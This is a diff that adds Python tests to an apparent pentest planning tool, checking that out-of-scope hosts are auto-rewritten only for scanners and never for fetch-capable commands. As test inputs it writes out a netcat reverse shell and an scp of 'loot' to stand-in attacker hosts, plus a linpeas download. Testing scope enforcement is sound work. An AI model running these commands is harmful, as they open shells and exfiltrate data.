@@ -344,6 +344,117 @@ def test_check_commands_annotates_and_counts() -> None:
     print("  D8(c) rollup: per-step badge + headline count + no-scope no-op: PASS")
 
 
+def test_only_target_directed_tools_are_auto_repointed() -> None:
+    """*** THE INVARIANT THAT KEEPS A TOOL DOWNLOAD OFF THE CLIENT'S HOST. ***
+
+    An out-of-scope host in a command is rewritten automatically only when the command's own
+    program is TARGET-DIRECTED — a scanner whose host argument is by definition the thing
+    being assessed. For a fetch-capable program the same host may be somewhere you are
+    getting a tool FROM, or a listener you own, and nothing in the argv says which. Those are
+    never rewritten without a human looking.
+    """
+    rs = AP.resolve_scope("www.crateandbarrel.me, *.thatconceptstore.com")
+    tgt = "www.crateandbarrel.me"
+
+    # target-directed: rewritten, and the replaced host is reported
+    for cmd, expect in (
+        ("nmap -sV tesla.com", "nmap -sV www.crateandbarrel.me"),
+        ("sublist3r -d tesla.com -t 100", "sublist3r -d www.crateandbarrel.me -t 100"),
+        ("nuclei -u https://tesla.com/api -t cves/",
+         "nuclei -u https://www.crateandbarrel.me/api -t cves/"),
+    ):
+        out, replaced = AP.auto_repoint(cmd, tgt, rs)
+        assert out == expect, (cmd, out)
+        assert replaced == ["tesla.com"], replaced
+
+    # FETCH-CAPABLE: untouched, whatever the host is.
+    for cmd in (
+        "curl -s https://raw.githubusercontent.com/x/linpeas.sh -o linpeas.sh",
+        "wget https://github.com/x/y/releases/download/v1/tool",
+        "nc attacker-vps.example.org 4444 -e /bin/sh",
+        "ssh root@jumpbox.corp.net",
+        "scp loot.tar.gz operator@my-vps.example.org:/tmp/",
+    ):
+        out, replaced = AP.auto_repoint(cmd, tgt, rs)
+        assert out == cmd and replaced == [], (
+            f"a fetch-capable command was auto-rewritten, which is how a tool download ends "
+            f"up pointed at the client: {cmd!r} -> {out!r}"
+        )
+
+    # an IN-SCOPE host is left alone even for a target-directed tool — including through a
+    # wildcard, because the check goes through the same scope model the executor uses
+    keep = "ffuf -u https://api-prod.thatconceptstore.com/FUZZ -w w.txt"
+    assert AP.auto_repoint(keep, tgt, rs) == (keep, [])
+
+    # the `@` position is never rewritten: it is userinfo or a resolver, not a target
+    assert AP.auto_repoint("dig @1.1.1.1 tesla.com", tgt, rs)[1] == []
+    # ...and a path/sudo/proxychains prefix does not hide the program
+    assert AP.auto_repoint("/usr/bin/nmap -sV tesla.com", tgt, rs)[1] == ["tesla.com"]
+    assert AP.auto_repoint("sudo nmap -sV tesla.com", tgt, rs)[1] == ["tesla.com"]
+    print("  target-directed tools repointed; fetch-capable ones never are: PASS")
+
+
+def test_a_declined_rewrite_is_offered_beside_the_original() -> None:
+    """What the automatic pass would not do, the operator may still do — by looking first.
+
+    The suggestion is never written into `cmd`. That is the entire safety property: the
+    reason the automatic pass declined is that only a human can tell a download from a
+    target, so the human has to see both.
+    """
+    rs = AP.resolve_scope("www.crateandbarrel.me")
+    tgt = "www.crateandbarrel.me"
+    phases = [{"phase": "recon", "label": "R", "steps": [{"id": "r-1", "title": "t",
+        "commands": [
+            {"lang": "bash", "cmd": "nmap -sV tesla.com"},
+            {"lang": "bash", "cmd": "curl -s https://raw.githubusercontent.com/x/l.sh -o l.sh"},
+            {"lang": "bash", "cmd": "john --wordlist=rockyou.txt hash.txt"},
+        ]}]}]
+
+    assert AP.repoint_commands(phases, tgt, rs) == 1
+    total, unrunnable = AP.check_commands(phases, rs, tgt)
+    assert (total, unrunnable) == (3, 2), (total, unrunnable)
+    scanned, fetched, local = phases[0]["steps"][0]["commands"]
+
+    # the scanner was repointed, and the ORIGINAL is kept rather than discarded
+    assert scanned["cmd"] == "nmap -sV www.crateandbarrel.me"
+    assert scanned["original_cmd"] == "nmap -sV tesla.com"
+    assert scanned["repointed_from"] == ["tesla.com"]
+    assert "runnable" not in scanned, "a repointed command should no longer be flagged"
+
+    # the download was NOT rewritten, and the suggestion sits beside it
+    assert fetched["cmd"].startswith("curl -s https://raw.githubusercontent.com/"), (
+        "the suggestion was written into cmd — it must only ever be offered"
+    )
+    assert fetched["runnable"] is False
+    assert fetched["suggested_cmd"] == "curl -s https://www.crateandbarrel.me/x/l.sh -o l.sh"
+    assert fetched["suggested_from"] == ["raw.githubusercontent.com"]
+
+    # nothing to swap -> no suggestion, rather than a button that does nothing
+    assert local["runnable"] is False
+    assert "suggested_cmd" not in local, local
+
+    # POSITIVE CONTROL — with no target nothing is repointed and nothing is suggested
+    fresh = [{"phase": "recon", "label": "R", "steps": [{"id": "r-1", "title": "t",
+        "commands": [{"lang": "bash", "cmd": "nmap -sV tesla.com"}]}]}]
+    assert AP.repoint_commands(fresh, None, rs) == 0
+    AP.check_commands(fresh, rs, None)
+    assert "suggested_cmd" not in fresh[0]["steps"][0]["commands"][0]
+    print("  a declined rewrite is offered beside the original, never applied: PASS")
+
+
+def test_the_two_tool_lists_do_not_overlap() -> None:
+    """A tool in both lists would be auto-rewritten AND declared unsafe to auto-rewrite."""
+    target = set(AP._TARGET_TOOL.split("|"))
+    fetch = set(AP._FETCH_TOOL.split("|"))
+    overlap = sorted(t for t in target & fetch if t)
+    assert not overlap, f"these tools are in BOTH lists, which means neither: {overlap}"
+    # and the union is what the host-position patterns read, so nothing may be lost
+    for tool in sorted(target | fetch):
+        if tool:
+            assert tool in AP._HOST_TOOL, f"{tool} fell out of the union"
+    print(f"  {len(target)} target-directed and {len(fetch)} fetch-capable tools, disjoint: PASS")
+
+
 if __name__ == "__main__":
     test_meta_doc_exclusion()
     test_substitution_scoping()
@@ -352,4 +463,7 @@ if __name__ == "__main__":
     test_target_comes_from_scope_when_the_goal_names_none()
     test_scope_check_marks_unrunnable_commands()
     test_check_commands_annotates_and_counts()
+    test_only_target_directed_tools_are_auto_repointed()
+    test_a_declined_rewrite_is_offered_beside_the_original()
+    test_the_two_tool_lists_do_not_overlap()
     print("ALL attack-path fix tests pass")
